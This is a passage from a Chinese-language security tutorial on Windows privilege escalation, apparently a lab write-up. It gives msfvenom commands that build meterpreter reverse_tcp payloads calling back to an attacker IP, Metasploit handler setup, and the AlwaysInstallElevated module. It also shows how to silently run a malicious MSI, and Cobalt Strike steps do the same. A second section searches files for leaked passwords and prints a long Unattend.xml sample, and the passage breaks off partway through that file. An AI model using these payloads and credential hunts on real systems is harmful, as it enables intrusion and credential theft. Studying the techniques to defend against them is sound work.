alt="image-20231214115002901"></p><h3 id="提权实验-2"><a href="#提权实验-2" class="headerlink" title="提权实验"></a>提权实验</h3><h4 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h4><p>首先拿到MSF的会话</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">4567</span> -f exe -o payload.exe <span class="hljs-regexp">//</span>生成木马<br><br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>set lhost <span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span><br>set lport <span class="hljs-number">4567</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214142553532.png" alt="image-20231214142553532"> </p><p>使用提权模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>local/always_install_elevated<br></code></pre></td></tr></table></figure><p>设置session后直接run就可以了，可能会失败</p><p>如果失败了我们可以使用MSF生成 msi文件然后上传上去运行即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">6789</span> -f msi -o payload.msi <span class="hljs-regexp">//</span>生成msi文件<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214144344787.png" alt="image-20231214144344787"></p><p>建立一个新的监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.210.100.128</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 6789</span><br>exploit<br></code></pre></td></tr></table></figure><p>将msi文件通过shell传上去,在meterpreter里执行即可</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">upload</span> payload.msi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214144419866.png" alt="image-20231214144419866"> </p><p>运行msi文件就可以了</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">execute</span> -f <span class="hljs-string">&quot;msiexec.exe /quiet /qn /i payload.msi&quot;</span><br></code></pre></td></tr></table></figure><p><strong>这里环境出了问题，注册表的HKCU没有配置好，administrator看是好的，apache用户：错误: 系统找不到指定的注册表项或值。</strong></p><p>得到新的shell提权成功</p><h4 id="利用CS提权"><a href="#利用CS提权" class="headerlink" title="利用CS提权"></a>利用CS提权</h4><p>先拿到cs的shell（apache用户）</p><p>利用CS生成exe文件，然后使用工具制作 MSI文件</p><p><img src="/img/image-20231214150931366.png" alt="image-20231214150931366"> </p><p>把msi文件传上去</p><p>运行即可 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec.exe /quiet /qn /i 1.msi<br></code></pre></td></tr></table></figure><p>提权到system用户</p><h2 id="6-泄露敏感信息提权"><a href="#6-泄露敏感信息提权" class="headerlink" title="6.泄露敏感信息提权"></a>6.泄露敏感信息提权</h2><h3 id="提权原理-4"><a href="#提权原理-4" class="headerlink" title="提权原理"></a>提权原理</h3><p>只要我们能知道电脑的最高权限的账号密码，或者一些票据或者凭证我们就可以通过认证，执行最高权限的命令</p><h3 id="提权环境-1"><a href="#提权环境-1" class="headerlink" title="提权环境"></a>提权环境</h3><h4 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h4><p>某些管理员会在系统上留下包含密码的配置文件 Unattend.xml 文件就是一个例子它允许对 Windows 系统进行大部分自动化设置搜索配置文件</p><p>递归式搜索当前目录中以 pass 为名的文件，或以 .config 结尾</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dir <span class="hljs-string">/s</span> *pass* == *<span class="hljs-string">.config</span><br>findstr <span class="hljs-string">/si</span> password *<span class="hljs-string">.xml</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span><br></code></pre></td></tr></table></figure><p>以下是一个 xml 文件</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">unattend</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:unattend&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;windowsPE&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DiskConfiguration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Disk</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CreatePartitions</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Size</span>&gt;</span>350<span class="hljs-tag">&lt;/<span class="hljs-name">Size</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CreatePartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Extend</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Extend</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Type</span>&gt;</span>Primary<span class="hljs-tag">&lt;/<span class="hljs-name">Type</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">CreatePartitions</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartitions</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>System<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TypeID</span>&gt;</span>0x27<span class="hljs-tag">&lt;/<span class="hljs-name">TypeID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModifyPartition</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Letter</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">Letter</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Label</span>&gt;</span>OS<span class="hljs-tag">&lt;/<span class="hljs-name">Label</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Format</span>&gt;</span>NTFS<span class="hljs-tag">&lt;/<span class="hljs-name">Format</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ModifyPartitions</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WillWipeDisk</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">WillWipeDisk</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Disk</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">DiskConfiguration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ImageInstall</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">OSImage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">InstallTo</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DiskID</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">DiskID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PartitionID</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">PartitionID</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">InstallTo</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">OSImage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ImageInstall</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserData</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AcceptEula</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">AcceptEula</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FullName</span>&gt;</span>Admin<span class="hljs-tag">&lt;/<span class="hljs-name">FullName</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Organization</span>&gt;</span>Organization<span class="hljs-tag">&lt;/<span class="hljs-name">Organization</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductKey</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Key</span>&gt;</span>WMDGN-G9PQG-XVVXX-R3X43-63DFG<span class="hljs-tag">&lt;/<span class="hljs-name">Key</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ProductKey</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">UserData</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">EnableFirewall</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">EnableFirewall</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core-WinPE&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SetupUILanguage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">SetupUILanguage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>0c09:00000409<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SystemLocale</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">SystemLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UILanguageFallback</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguageFallback</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;offlineServicing&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-LUA-Settings&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">EnableLUA</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">EnableLUA</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;generalize&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 跳过自动激活 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SkipRearm</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">SkipRearm</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;specialize&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Deployment&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExtendOSPartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Extend</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Extend</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ExtendOSPartition</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RunSynchronous</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 禁用 ctrl + alt + delete --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RunSynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>DisableCAD<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Path</span>&gt;</span>cmd /c reg add</span><br><span class="language-xml">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v DisableCAD</span><br><span class="language-xml">/t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">Path</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">RunSynchronousCommand</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RunSynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>DisableCAD<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Path</span>&gt;</span>cmd /c reg add &quot;HKLM\SOFTWARE\Microsoft\Windows</span><br><span 